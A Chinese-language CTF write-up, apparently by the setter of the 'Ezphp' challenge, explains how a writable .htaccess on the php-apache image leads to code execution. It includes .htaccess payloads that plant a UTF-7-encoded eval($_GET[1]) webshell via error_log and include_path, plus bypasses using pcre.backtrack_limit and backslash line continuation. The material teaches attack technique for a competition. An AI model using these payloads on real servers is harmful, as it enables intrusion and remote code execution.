## 前言
Ezphp设计的初衷是今年wctf的时候，我们在做pdoor这题时发现php-apache这个官方镜像的htaccess文件默认是生效的，因为脑海里一直有固有的htaccess文件默认不生效的想法，然后发现是`/etc/apache2/conf-enabled`目录下有一个docker-php.conf文件里设置了htaccess的生效。然后就想出一个能写htaccess情况下我们能做什么的题。

## 预期解

### htaccess生效
如果尝试上传htaccess文件会发现出现响应500的问题，因为文件尾有Just one chance
这里采用`# \`的方式将换行符转义成普通字符，就可以用`#`来注释单行了。

### 利用文件包含
代码中有一处`include_once("fl3g.php");`，php的配置选项中有include_path可以用来设置include的路径。如果tmp目录下有fl3g.php，在可以通过将include_path设置为tmp的方式来完成文件包含。

### tmp目录写文件
* 如何在指定目录写指定文件名的文件呢？php的配置选项中有error_log可以满足这一点。error_log可以将php运行报错的记录写到指定文件中。
* 如何触发报错呢？这就是为什么代码中写了一处不存在的fl3g.php的原因。我们可以将include_path的内容设置成payload的内容，这时访问页面，页面尝试将payload作为一个路径去访问时就会因为找不到fl3g.php而报错，而如果fl3g.php存在，则会因为include_path默认先访问web目录而不会报错。
* 写进error_log的内容会被html编码怎么绕过？这个点是比较常见的，采用utf7编码即可。

### payload
* 第一步，通过error_log配合include_path在tmp目录生成shell
```
php_value error_log /tmp/fl3g.php
php_value error_reporting 32767
php_value include_path "+ADw?php eval($_GET[1])+ADs +AF8AXw-halt+AF8-compiler()+ADs"
# \
```
* 第二步，通过include_path和utf7编码执行shell
```
php_value include_path "/tmp"
php_value zend.multibyte 1
php_value zend.script_encoding "UTF-7"
# \
```

## 非预期
比赛时候一共有18个队解出Ezphp这题。看了WriteUp后发现只有一个队伍是预期解做的，其余一个队采用了非预期1的方法，剩下的16个队都是用的非预期2。也算是自己出题的一个大失误了，因为本意是不想限制太严看看php的配置选项能完成什么更多的花来，但是非预期2脱离了我的本意Orz。

### 非预期1
因为正则判断写的是`if(preg_match("/[^a-z\.]/", $filename) == 1) {`而不是`if(preg_match("/[^a-z\.]/", $filename) !== 0) {`，因此存在了被绕过的可能。
通过设置.htaccess
```
php_value pcre.backtrack_limit 0
php_value pcre.jit 0
```
导致preg_match返回False，继而绕过了正则判断，filename即可通过伪协议绕过前面stristr的判断实现Getshell。

### 非预期2
惨痛的教训23333
上文提到用`\`来转义换行符来绕过最后加一行的限制。
所以同理你也可以用`\`来绕过stristr处的所有限制233333。型如
```
php_value auto_prepend_fi\
le ".htaccess"
```